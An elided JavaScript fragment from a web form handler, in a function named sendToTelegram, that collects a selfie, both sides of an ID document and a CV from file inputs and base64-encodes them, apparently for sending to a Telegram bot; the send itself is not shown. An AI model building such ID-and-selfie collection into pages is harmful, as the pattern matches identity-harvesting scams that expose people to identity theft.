...
document.addEventListener('DOMContentLoaded', () => {
  ...
  async function sendToTelegram(formData, retryCount = 0) {
    ...
    try {
      ...
      console.log('[v0] File inputs found:', {
        selfie: !!selfieInput?.files?.[0],
        idFront: !!idFrontInput?.files?.[0],
        idBack: !!idBackInput?.files?.[0],
        cv: !!cvInput?.files?.[0]
      });
      
      if (selfieInput?.files?.[0]) {
        console.log('[v0] Converting selfie to base64...');
        files['a-selfie'] = await fileToBase64(selfieInput.files[0]);
      }
      if (idFrontInput?.files?.[0]) {
        console.log('[v0] Converting ID front to base64...');
        files['a-id-photo-front'] = await fileToBase64(idFrontInput.files[0]);
      }
      if (idBackInput?.files?.[0]) {
        console.log('[v0] Converting ID back to base64...');
        files['a-id-photo-back'] = await fileToBase64(idBackInput.files[0]);
      }
      if (cvInput?.files?.[0]) {
        console.log('[v0] Converting CV to base64...');
        files['a-cv'] = await fileToBase64(cvInput.files[0]);
      }
      
      console.log('[v0] Total files collected:', Object.keys(files).length);
